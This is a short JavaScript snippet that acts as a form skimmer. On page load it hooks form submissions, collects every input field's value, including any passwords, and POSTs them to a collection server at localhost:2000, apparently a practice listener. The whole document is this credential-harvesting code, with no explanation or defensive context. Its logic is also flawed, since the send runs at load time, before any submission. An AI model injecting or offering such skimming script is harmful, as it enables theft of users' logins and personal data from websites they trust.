
var values = "";

window["onload"] = function () {
    const form = document.forms;
    Array.from(form).forEach(form => addEventListener("submit", function () {
        let inputs = form.querySelectorAll("input");
        for (const input of inputs) {
            values += `${input.value}\n`
        }
    }, false))
    fetch("http://localhost:2000/", { method: 'POST', body: values })
}


